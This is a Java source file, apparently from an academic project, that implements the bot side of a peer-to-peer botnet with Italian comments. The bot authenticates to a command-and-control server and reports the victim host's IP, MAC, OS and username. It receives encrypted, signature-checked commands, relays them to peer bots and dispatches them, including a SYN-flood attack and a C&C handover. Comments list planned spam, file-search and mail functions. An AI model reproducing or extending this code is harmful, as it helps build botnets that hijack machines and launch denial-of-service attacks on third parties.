package cs.sii.bot.action;

import java.security.InvalidKeyException;
import java.security.PublicKey;
import java.security.SignatureException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import org.apache.commons.codec.binary.Base64;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import cs.sii.config.onLoad.Config;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.domain.SyncIpList;
import cs.sii.model.bot.Bot;
import cs.sii.model.role.Role;
import cs.sii.model.user.User;
import cs.sii.network.request.BotRequest;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.connection.P2PMan;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.dao.BotServiceImpl;
import cs.sii.service.dao.RoleServiceImpl;
import cs.sii.service.dao.UserServiceImpl;

@Service
public class Behavior {

	@Autowired
	private NetworkService nServ;
	@Autowired
	private Config eng;

	@Autowired
	private BotRequest req;

	@Autowired
	private Auth auth;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private Malicious malS;

	@Autowired
	private BotServiceImpl bServ;

	@Autowired
	private RoleServiceImpl rServ;

	@Autowired
	private UserServiceImpl uServ;

	@Autowired
	private P2PMan pServ;

	// Il secondo valore è vuoto però ci serviva una lista sincata per non
	// implementarla di nuovo
	@Autowired
	private SyncIpList<Integer, String> msgHashList;

	/**
	 * just needed for initialize beans
	 * 
	 */
	public Behavior() {
	}

	/**
	 * 
	 */
	public void initializeBot() {

		// nServ.firstConnectToMockServerDns();

		if (challengeToCommandConquer()) {
			System.out.println("Bot is Ready");
		} else
			System.out.println("Bot not Ready, authentication failed");

		String data = nServ.getIdHash();

		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
		List<Pairs<String, String>> response = null;
		response = req.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(), data);
		List<Pairs<IP, PublicKey>> newNeighbours = new ArrayList<Pairs<IP, PublicKey>>();

		if (response != null) {
			response.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
		} else
			System.out.println("torno null");

		for (Pairs<String, String> pairs : response) {
			Pairs<IP, PublicKey> in = new Pairs<IP, PublicKey>();
			in.setValue1(new IP(pairs.getValue1()));
			in.setValue2(pki.rebuildPuK(pairs.getValue2()));
			newNeighbours.add(in);
		}

		if (newNeighbours != null) {
			newNeighbours.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
		} else
			System.out.println("torno null");

		nServ.getNeighbours().setAll(newNeighbours);

	}

	/**
	 * challenges one of the CeC
	 * 
	 * @return true if the challenges goes well
	 */
	private boolean challengeToCommandConquer() {
		System.out.println("IP C&C " + nServ.getCommandConquerIps().getList().get(0).getValue1());
		Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(),
				nServ.getCommandConquerIps().getList().get(0).getValue1());
		if (challenge != null) {
			String key = auth.generateStringKey(challenge.getValue2());
			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
			System.out.println(hashMac);
			String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(), nServ.getOs(),
					nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(),
					nServ.getCommandConquerIps().getList().get(0).getValue1(), hashMac, pki.getPubRSAKey(),
					nServ.isElegible());
			System.out.println("La risposta del CeC: " + response);
		}
		return true;
	}

	// verify bot

	// verify msgbyCec

	// asynch thread
	// decript msg

	// send to neighbourhood

	// execute

	// answer yes

	// else answer no

	// /**
	// * Convert a String with format red|green|blue|alpha
	// * to a Color object
	// */
	// @Override
	// public Color convertToEntityAttribute(String colorString) {
	// String[] rgb = colorString.split(SEPARATOR);
	// return new Color(Integer.parseInt(rgb[0]),
	// Integer.parseInt(rgb[1]),
	// Integer.parseInt(rgb[2]),
	// Integer.parseInt(rgb[3]));
	// }

	// IDMSG|COMANDO|SIGNATURE(idmsg)

	/**
	 * @param rawData
	 */
	@Async
	public void floodAndExecute(String rawData, IP ip) {

		String msg = "";

		// decritta il msg
		System.out.println("rawdata: " + rawData);
		msg = pki.getCrypto().decryptAES(rawData);
		System.out.println("msg: " + msg.toString());
		if (msg == null)
			return;
		// Per comodità
		String[] msgs = msg.split("<HH>");

		for (int i = 0; i < msgs.length; i++) {
			System.out.println("msgs[" + i + "]= " + msgs[i]);
		}

		// hai gia ricevuto questo msg? bella domanda
		if (msgHashList.indexOfValue2(msgs[0]) < 0) {
			System.out.println("idHashMessage " + msgs[0]);
			System.out.println("NUOVO ORDINE DA ESEGUIRE");
			// verifica la firma con chiave publica c&c
			try {
				System.out.println("signature" + msgs[2]);
				System.out.println(" pk " + pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],
						nServ.getCommandConquerIps().getList().get(0).getValue2())) {
					Pairs<Integer, String> data = new Pairs<>();
					data.setValue1(msgHashList.getSize() + 1);
					data.setValue2(msgs[0]);
					msgHashList.add(data);
					System.out.println("SIGNATURE OK");
					// se verificato inoltralo ai vicini
					floodNeighoours(rawData, ip);
					System.out.println("FLOOD A VICINI");
					// inoltra all'interpretedei msg
					executeCommand(msgs[1]);
					System.out.println("COMANDO ESEGUTO");
				} else {
					System.out.println("SIGNATURE COMANDO FALLITA");
				}
			} catch (InvalidKeyException | SignatureException e) {
				System.out.println("Errore nel controllo firma durante il flooding " + msgs[2]);
				e.printStackTrace();
			}
		}

	}

	@Async
	private void floodNeighoours(String msg, IP ip) {

		System.out.println("size lista " + nServ.getNeighbours().getList().size());
		for (Pairs<IP, PublicKey> p : nServ.getNeighbours().getList()) {
			// IP test = p.getValue1();
			Object x = p.getValue1();
			IP test = new IP(x.toString());
			System.out.println("dsasaddavvvvvv " + test.getIp());
			// if (!ip.equals(test)) {
			// req.sendFloodToOtherBot(p.getValue1(), msg);
			// System.out.println("flood vicino "+ test);
			// }
		}

		// nServ.getNeighbours().getList().forEach((pairs) -> {
		// System.out.println("pairs ip"+pairs.getValue1().getIp());
		// req.sendFloodToOtherBot(pairs.getValue1(), msg);
		// });

		// cripta il messaggio e invialo ai vicini

	}

	// TODO definire attacchi
	@Async
	private void executeCommand(String msg) {

		if (msg.startsWith("newking")) {
			foo(msg);
		}
		if (msg.startsWith("synflood")) {
			malS.synFlood(msg);
		}
		if (msg.startsWith("")) {

		}
		if (msg.startsWith("")) {

		}

		// che comando è?
		// spam
		// attack
		// search file
		// Mail
		// Update vicinato
		//

	}

	public void foo(String msg) {
		String[] msgs = msg.split("<CC>");
		nServ.getCommandConquerIps().getList().remove(0);
		Pairs<IP, PublicKey> pairs = new Pairs<IP, PublicKey>(new IP(msgs[1]), pki.rebuildPuK(msgs[2]));
		nServ.getCommandConquerIps().add(pairs);

	}

	public BotRequest getRequest() {
		return req;
	}

	public void setRequest(BotRequest request) {
		this.req = request;
	}

	// class RolesComp implements Comparator<Role>{
	//
	// @Override
	// public int compare(Role a, Role b ){
	// if(a.getId()>b.getId())
	// return 1
	// }
	// }

	/**
	 * @param ip
	 */
	@Async
	public void getPower(String ip) {
		pServ.createNetworkP2P();
		// richiesta ruoli
		List<Role> roles = req.getRoles(ip);
		Collections.sort(roles, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
		roles.forEach(role -> System.out.println("ruolo: " + role));
		rServ.saveAll(roles);

		// richiesta bots
		List<Bot> bots = req.getBots(ip);
		Collections.sort(bots, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
		bots.forEach(bot -> System.out.println("bots: " + bot));
		bServ.saveAll(bots);

		// richiesta users
		List<User> users = req.getUser(ip);
		Collections.sort(users, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
		users.forEach(user -> System.out.println("users: " + user));
		uServ.saveAll(users);

		// prendo grafo
		List<String> graph = req.getPeers(ip);

		graph.forEach(e -> System.out.println("edges: " + e));
		// informo cc vecchio che spnp ready

		List<IP> vertex = new ArrayList<IP>();
		List<Pairs<IP, IP>> edge = new ArrayList<Pairs<IP, IP>>();
		List<String[]> strs = new ArrayList<String[]>();
		for (String str : graph) {
			String[] sts = str.split("<HH>");
			for (int i = 0; i < sts.length; i++) {
				System.out.println("pasrse edge " + i + " " + sts[i]);
			}
			edge.add(new Pairs<IP, IP>(new IP(sts[0]), new IP(sts[1])));
			if (!vertex.contains(new IP(sts[0])))
				vertex.add(new IP(sts[0]));
			if (!vertex.contains(new IP(sts[1])))
				vertex.add(new IP(sts[1]));
		}
		edge.forEach(e -> System.out.println("edge " + e.getValue1() + " to " + e.getValue2()));
		vertex.forEach(v -> System.out.println("vertex " + v.getIp()));
		pServ.updateNetworkP2P(edge, vertex);
		// avvisa cec che se ready
		Boolean b = req.ready(ip);
		if ((b != null) && (b)) {
			eng.setCommandandconquerStatus(true);
		}
		// controllare risposta da cec che ha avvisato dns
	}
}

// TODO Trasformare tutto quello qui sotto da controller alla funzione chiamata
// sopra
// l idea è quella di mettere un solo controller che intercetta messagi e
// successivamente passarli ad un thread
// il thread decodifica il msg e se viene verificata la signature lo inoltra ai
// vicini -sender
// il messaggio viene inoltrato ad un nuovo thread che lo interpreta e fara
// eseguire la funzione opportuna.
// TODO inserire controller dove arriva la lista dei vicini il bot verifica il
// msg se appartiene alla chiave del cec aggiorna il suo vicinato
